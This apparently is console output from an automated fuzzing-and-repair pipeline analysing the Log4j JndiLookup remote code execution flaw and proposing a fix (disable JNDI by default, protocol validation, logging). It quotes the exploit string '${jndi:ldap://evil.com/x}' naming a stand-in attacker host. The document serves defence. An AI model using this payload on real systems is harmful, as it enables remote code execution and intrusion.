[2;36m                    [0m         violation at line [1;36m61[0m                                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ### Key Observations                                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         - The vulnerability occurs during the message formatting phase of logging           [2m                [0m
[2;36m                    [0m         operations, specifically when processing variable substitution patterns             [2m                [0m
[2;36m                    [0m         - The issue is triggered through the `JndiLookup` class, which is part of Log4j's   [2m                [0m

[2;36m                    [0m         - The fuzzer successfully detected this vulnerability through the Jazzer sanitizer  [2m                [0m

[2;36m                    [0m         - The issue is marked with deduplication token `03a39a742f79fa3d` for tracking      [2m                [0m

[2;36m                    [0m            - What validation or sanitization is applied to lookup URLs                      [2m                [0m

[2;36m                    [0m         [1;36m21[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m: * Lookup a String key to a String value.[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m: * This class represents the simplest form of a string to string map.[0m            [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m: * It has a benefit over a map in that it can create the result on[0m               [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m: * demand based on the key.[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m: * This class comes complete with various factory methods.[0m                       [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m: * If these do not suffice, you can subclass and implement your own matcher.[0m     [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m: * For example, it would be possible to implement a lookup that used the[0m         [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m: * key as a primary key, and looked up the value on demand from the database[0m     [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m: * @version $Id$[0m                                                                 [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:public interface StrLookup [0m[1;39m{[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:     * Looks up a String key to a String value.[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * <p>[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     * The internal implementation may use any mechanism to return the value.[0m    [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:     * The simplest implementation is to use a Map. However, virtually any[0m       [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:     * implementation is possible.[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:     * <p>[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:     * For example, it would be possible to implement a lookup that used the[0m     [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:     * key as a primary key, and looked up the value on demand from the database[0m [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:     * Or, a numeric based implementation could be created that treats the key[0m   [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:     * as an integer, increments the value and return the result as a string -[0m   [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:     * converting [0m[1;36m1[0m[39m to [0m[1;36m2[0m[39m, [0m[1;36m15[0m[39m to [0m[1;36m16[0m[39m etc.[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:     * <p>[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     * The [0m[1;39m{[0m[39m@link #[0m[1;35mlookup[0m[1;39m([0m[39mString[0m[1;39m)[0m[1;39m}[0m[39m method always returns a String, regardless of[0m [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:     * the underlying data, by converting it as necessary. For example:[0m          [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:     * <pre>[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:     * Map<String, Object> map = new HashMap<String, Object>[0m[1;39m([0m[1;39m)[0m[39m;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:     * [0m[1;35mmap.put[0m[1;39m([0m[32m"number"[0m[39m, new [0m[1;35mInteger[0m[1;39m([0m[1;36m2[0m[1;39m)[0m[1;39m)[0m[39m;[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:     * [0m[1;35massertEquals[0m[1;39m([0m[32m"2"[0m[39m, [0m[1;35mStrLookup.mapLookup[0m[1;39m([0m[39mmap[0m[1;39m)[0m[1;35m.lookup[0m[1;39m([0m[32m"number"[0m[1;39m)[0m[1;39m)[0m[39m;[0m             [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:     * <[0m[35m/[0m[95mpre[0m[39m>[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:     * @param key  the key to be looked up, may be null[0m                          [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:     * @return the matching value, null if no match[0m                              [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:    String [0m[1;35mlookup[0m[1;39m([0m[39mString key[0m[1;39m)[0m[39m;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:     * Looks up a String key to a String value possibly using the current [0m       [2m                [0m
[2;36m                    [0m         [39mLogEvent.[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:     * <p>[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:     * The internal implementation may use any mechanism to return the value.[0m    [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:     * The simplest implementation is to use a Map. However, virtually any[0m       [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:     * implementation is possible.[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:     * <p>[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:     * For example, it would be possible to implement a lookup that used the[0m     [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:     * key as a primary key, and looked up the value on demand from the database[0m [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:     * Or, a numeric based implementation could be created that treats the key[0m   [2m                [0m

[2;36m                    [0m         [1;36m73[0m[39m:     * converting [0m[1;36m1[0m[39m to [0m[1;36m2[0m[39m, [0m[1;36m15[0m[39m to [0m[1;36m16[0m[39m etc.[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:     * <p>[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:     * The [0m[1;39m{[0m[39m@link #[0m[1;35mlookup[0m[1;39m([0m[39mString[0m[1;39m)[0m[1;39m}[0m[39m method always returns a String, regardless of[0m [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:     * the underlying data, by converting it as necessary. For example:[0m          [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:     * <pre>[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:     * Map<String, Object> map = new HashMap<String, Object>[0m[1;39m([0m[1;39m)[0m[39m;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:     * [0m[1;35mmap.put[0m[1;39m([0m[32m"number"[0m[39m, new [0m[1;35mInteger[0m[1;39m([0m[1;36m2[0m[1;39m)[0m[1;39m)[0m[39m;[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:     * [0m[1;35massertEquals[0m[1;39m([0m[32m"2"[0m[39m, [0m[1;35mStrLookup.mapLookup[0m[1;39m([0m[39mmap[0m[1;39m)[0m[1;35m.lookup[0m[1;39m([0m[32m"number"[0m[1;39m)[0m[1;39m)[0m[39m;[0m             [2m                [0m

[2;36m                    [0m         [39m## Analysis of the Issue[0m                                                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mBased on the evaluation report and code snippets, the vulnerability is clear:[0m       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **Root Cause**: The `[0m[1;35mJndiLookup.lookup[0m[1;39m([0m[1;39m)[0m[39m` method performs JNDI lookups on [0m       [2m                [0m
[2;36m                    [0m         [39mattacker-controlled URLs without validation, allowing remote code execution via [0m    [2m                [0m
[2;36m                    [0m         [39mprotocols like ldap:[0m[35m/[0m[35m/[0m[39m, rmi:[0m[35m/[0m[35m/[0m[39m, dns:[0m[35m/[0m[35m/[0m[95m.[0m                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Attack Path**: User input containing `$[0m[1;39m{[0m[39mjndi:ldap:[0m[35m/[0m[35m/evil.com/[0m[95mx[0m[1;39m}[0m[39m` → [0m            [2m                [0m
[2;36m                    [0m         [39mMessagePatternConverter → StrSubstitutor → Interpolator → JndiLookup → Remote JNDI [0m [2m                [0m
[2;36m                    [0m         [39mlookup[0m                                                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **Existing Controls**: [0m                                                          [2m                [0m
[2;36m                    [0m         [39m   - `ENABLE_JNDI` flag exists but defaults to `true` and isn't integrated with [0m    [2m                [0m
[2;36m                    [0m         [39mconfiguration system[0m                                                                [2m                [0m
[2;36m                    [0m         [39m   - `[0m[1;35mconvertJndiName[0m[1;39m([0m[1;39m)[0m[39m` only adds prefixes, doesn't validate security[0m              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. **Core Logic to Preserve**: [0m                                                     [2m                [0m
[2;36m                    [0m         [39m   - Legitimate JNDI lookups for local container resources [0m[1;39m([0m[39mjav[0m[1;92ma:c[0m[39momp/env/*[0m[1;39m)[0m        [2m                [0m
[2;36m                    [0m         [39m   - Variable substitution system for other lookups[0m                                 [2m                [0m
[2;36m                    [0m         [39m   - Plugin architecture[0m                                                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Comprehensive Fix Strategy[0m                                                       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### [0m[1;36m1[0m[39m. **Disable JNDI Lookups by Default** [0m[1;39m([0m[39mPrimary Defense[0m[1;39m)[0m                        [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Location**: [0m                                                                      [2m                [0m
[2;36m                    [0m         [39m`core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java`[0m           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Changes**:[0m                                                                        [2m                [0m
[2;36m                    [0m         [39m- Modify the static field initialization at line [0m[1;36m31[0m[39m from `private static boolean [0m   [2m                [0m
[2;36m                    [0m         [39mENABLE_JNDI = true;` to integrate with PropertiesUtil[0m                               [2m                [0m
[2;36m                    [0m         [39m- Add a static initializer block [0m[1;39m([0m[39mfollowing the pattern in ThreadContext.java lines[0m [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m-[0m[1;36m77[0m[1;39m)[0m[39m to read configuration[0m                                                        [2m                [0m
[2;36m                    [0m         [39m- Default to `false` for security, requiring explicit opt-in[0m                        [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Implementation approach**:[0m                                                        [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39mAdd after line [0m[1;36m31[0m[39m:[0m                                                                  [2m                [0m

[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Location**: [0m                                                                      [2m                [0m

[2;36m                    [0m         [39m### [0m[1;36m3[0m[39m. **Update convertJndiName for Stricter Validation**[0m                           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Location**: [0m                                                                      [2m                [0m
[2;36m                    [0m         [39m`core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.jav[0m[1;92ma:73[0m[39m-[0m[1;36m79[0m[39m`[0m     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Changes**:[0m                                                                        [2m                [0m
[2;36m                    [0m         [39m- Keep the existing prefix addition logic [0m[1;39m([0m[39mneeded for backward compatibility[0m[1;39m)[0m       [2m                [0m
[2;36m                    [0m         [39m- The validation will happen in the new `isValidJndiName` method before this [0m       [2m                [0m
[2;36m                    [0m         [39mconversion[0m                                                                          [2m                [0m
[2;36m                    [0m         [39m- No changes needed to convertJndiName itself[0m                                       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### [0m[1;36m4[0m[39m. **Add Configuration Constant** [0m[1;39m([0m[39mOptional but Recommended[0m[1;39m)[0m                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Location**: [0m                                                                      [2m                [0m
[2;36m                    [0m         [39m`core/src/main/java/org/apache/logging/log4j/core/helpers/Constants.java`[0m           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Changes**:[0m                                                                        [2m                [0m
[2;36m                    [0m         [39m- Add a constant for the property name following the existing pattern [0m[1;39m([0m[39mlines [0m[1;36m29[0m[39m-[0m[1;36m36[0m[1;39m)[0m [2m                [0m
[2;36m                    [0m         [39m- This makes the property name centrally documented and reduces typos[0m               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Implementation approach**:[0m                                                        [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39mAdd after line [0m[1;36m41[0m[39m:[0m                                                                  [2m                [0m
[2;36m                    [0m         [35m/[0m[39m**[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m * Name of the system property to enable/disable JNDI lookups.[0m                      [2m                [0m
[2;36m                    [0m         [39m *[0m[35m/[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39mpublic static final String LOG4J_ENABLE_JNDI = [0m[32m"log4j2.enableJndi"[0m[39m;[0m                 [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mThen update JndiLookup to use this constant instead of hardcoded string.[0m            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### [0m[1;36m5[0m[39m. **Add Logging for Security Events**[0m                                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Location**: [0m                                                                      [2m                [0m
[2;36m                    [0m         [39m`core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java`[0m           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Changes**:[0m                                                                        [2m                [0m
[2;36m                    [0m         [39m- Import StatusLogger at the top [0m[1;39m([0m[39mfollowing pattern in other lookup classes[0m[1;39m)[0m        [2m                [0m
[2;36m                    [0m         [39m- Add static logger field[0m                                                           [2m                [0m
[2;36m                    [0m         [39m- Log when JNDI lookups are disabled[0m                                                [2m                [0m
[2;36m                    [0m         [39m- Log when dangerous protocols are rejected[0m                                         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Implementation approach**:[0m                                                        [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39mAdd after imports:[0m                                                                  [2m                [0m
[2;36m                    [0m         [39mimport org.apache.logging.log4j.Logger;[0m                                             [2m                [0m
[2;36m                    [0m         [39mimport org.apache.logging.log4j.status.StatusLogger;[0m                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mAdd after line [0m[1;36m29[0m[39m:[0m                                                                  [2m                [0m
[2;36m                    [0m         [39mprivate static final Logger LOGGER = [0m[1;35mStatusLogger.getLogger[0m[1;39m([0m[1;39m)[0m[39m;[0m                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mIn static initializer block, log the configuration:[0m                                 [2m                [0m
[2;36m                    [0m         [1;35mLOGGER.info[0m[1;39m([0m[32m"JNDI lookup is [0m[32m{[0m[32m}[0m[32m"[0m[39m, ENABLE_JNDI ? [0m[32m"enabled"[0m[39m : [0m[32m"disabled"[0m[1;39m)[0m[39m;[0m             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mIn isValidJndiName when rejecting:[0m                                                  [2m                [0m
[2;36m                    [0m         [1;35mLOGGER.warn[0m[1;39m([0m[32m"Rejecting JNDI lookup with potentially dangerous protocol: [0m[32m{[0m[32m}[0m[32m"[0m[39m, [0m       [2m                [0m
[2;36m                    [0m         [39mjndiName[0m[1;39m)[0m[39m;[0m                                                                          [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Justification[0m                                                                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Why This is Optimal:[0m                                                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **Security by Default**: Disabling JNDI by default protects all users [0m           [2m                [0m
[2;36m                    [0m         [39mimmediately without requiring configuration changes[0m                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Backward Compatibility**: Legitimate users can re-enable JNDI with a simple [0m   [2m                [0m
[2;36m                    [0m         [39mproperty, and local jav[0m[1;92ma:c[0m[39momp/env resources still work[0m                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **Defense-in-Depth**: Even if JNDI is enabled, protocol validation blocks remote[0m [2m                [0m
[2;36m                    [0m         [39mlookups[0m                                                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. **Minimal Changes**: Focuses changes on JndiLookup class only, avoiding [0m         [2m                [0m
[2;36m                    [0m         [39mmodifications to:[0m                                                                   [2m                [0m
[2;36m                    [0m         [39m   - Interpolator [0m[1;39m([0m[39mpreserves lookup routing[0m[1;39m)[0m                                        [2m                [0m
[2;36m                    [0m         [39m   - StrSubstitutor [0m[1;39m([0m[39mpreserves variable substitution[0m[1;39m)[0m                               [2m                [0m
[2;36m                    [0m         [39m   - MessagePatternConverter [0m[1;39m([0m[39mpreserves message formatting[0m[1;39m)[0m                         [2m                [0m
[2;36m                    [0m         [39m   - Test code [0m[1;39m([0m[39mno test modifications needed[0m[1;39m)[0m                                       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m. **Follows Existing Patterns**: [0m                                                  [2m                [0m
[2;36m                    [0m         [39m   - Static initialization matches ThreadContext.java pattern[0m                       [2m                [0m
[2;36m                    [0m         [39m   - PropertiesUtil integration matches existing configuration system[0m               [2m                [0m
[2;36m                    [0m         [39m   - Logging follows StatusLogger pattern from other lookups[0m                        [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### How It Preserves Existing Logic:[0m                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m- Variable substitution system remains unchanged[0m                                    [2m                [0m
[2;36m                    [0m         [39m- Other lookup types [0m[1;39m([0m[39msys, env, date, map[0m[1;39m)[0m[39m continue working[0m                         [2m                [0m
[2;36m                    [0m         [39m- Pattern layout and message formatting unaffected[0m                                  [2m                [0m
[2;36m                    [0m         [39m- Plugin discovery mechanism unchanged[0m                                              [2m                [0m
[2;36m                    [0m         [39m- Local JNDI resources [0m[1;39m([0m[39mjav[0m[1;92ma:c[0m[39momp/env/*[0m[1;39m)[0m[39m still accessible when enabled[0m              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### How It Addresses the Issues:[0m                                                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m- **Blocks Remote RCE**: Protocol validation prevents ldap:[0m[35m/[0m[35m/[0m[39m, rmi:[0m[35m/[0m[35m/[0m[39m, dns:[0m[35m/[0m[35m/[0m[39m [0m      [2m                [0m
[2;36m                    [0m         [39mlookups[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m- **Configurable**: Users can enable/disable via system property or properties file[0m [2m                [0m
[2;36m                    [0m         [39m- **Auditable**: Logs security-relevant events for monitoring[0m                       [2m                [0m
[2;36m                    [0m         [39m- **No Harness Changes**: Fix is in source code, not fuzzing logic[0m                  [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Potential Side Effects and Mitigation:[0m                                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **Breaking Change**: Applications using JNDI lookups in log messages will need [0m  [2m                [0m
[2;36m                    [0m         [39mto set `log4j2.[0m[33menableJndi[0m[39m=[0m[35mtrue[0m[39m`[0m                                                     [2m                [0m
[2;36m                    [0m         [39m   - **Mitigation**: Document clearly in release notes; provide migration guide[0m     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Performance**: Additional validation check on every JNDI lookup[0m                [2m                [0m
[2;36m                    [0m         [39m   - **Mitigation**: Minimal impact [0m[1;39m([0m[39msimple string checks[0m[1;39m)[0m[39m; JNDI disabled by [0m       [2m                [0m
[2;36m                    [0m         [39mdefault means no overhead for most users[0m                                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **Legitimate Remote JNDI**: Some applications might use remote JNDI legitimately[0m [2m                [0m
[2;36m                    [0m         [39m   - **Mitigation**: These are rare; users can modify validation logic if needed, [0m  [2m                [0m
[2;36m                    [0m         [39mbut default must be secure[0m                                                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Similar Solutions in Codebase:[0m                                                  [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m- ThreadContext uses same PropertiesUtil pattern for feature toggles [0m[1;39m([0m[39mlines [0m[1;36m71[0m[39m-[0m[1;36m77[0m[1;39m)[0m  [2m                [0m
[2;36m                    [0m         [39m- Other lookup implementations [0m[1;39m([0m[39mDateLookup, MapLookup[0m[1;39m)[0m[39m show defensive programming [0m  [2m                [0m
[2;36m                    [0m         [39mwith null checks and exception handling[0m                                             [2m                [0m
[2;36m                    [0m         [39m- SystemPropertiesLookup shows try-catch pattern for safe error handling[0m            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Final Implementation Notes[0m                                                       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mThe fix should be applied to the initial codebase in this order:[0m                    [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. Add imports and logger to JndiLookup[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. Add static initialization block reading property[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. Add isValidJndiName validation method[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. Update lookup method to call validation[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m. Add constant to Constants.java[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m. Test with both enabled/disabled configurations[0m                                   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mThis approach provides maximum security while maintaining necessary functionality [0m  [2m                [0m
[2;36m                    [0m         [39mand follows Log4j's existing architectural patterns.[0m                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mfix_strategy[0m[1m>[0m                                                                     [2m                [0m
[2;36m                    [0m         ===Evaluation [33mEnd[0m===                                                                [2m                [0m
